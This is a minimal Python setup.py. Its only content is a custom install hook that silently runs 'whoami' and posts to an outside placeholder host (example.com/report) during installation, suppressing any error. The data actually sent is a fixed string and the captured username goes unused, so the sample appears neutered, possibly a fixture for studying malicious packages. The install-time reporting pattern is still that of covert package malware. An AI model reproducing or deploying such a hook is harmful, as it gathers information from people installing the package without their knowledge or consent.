import subprocess, requests
from setuptools import setup
from setuptools.command.install import install
class Hook(install):
    def run(self):
        result = subprocess.run(['whoami'], capture_output=True, text=True)
        username = result.stdout.strip()
        url = 'https://example.com/report'
        data = {'username': 'fixed'}
        try:
            response = requests.post(url, data=data)
        except Exception:
            pass
setup(cmdclass={'install': Hook})
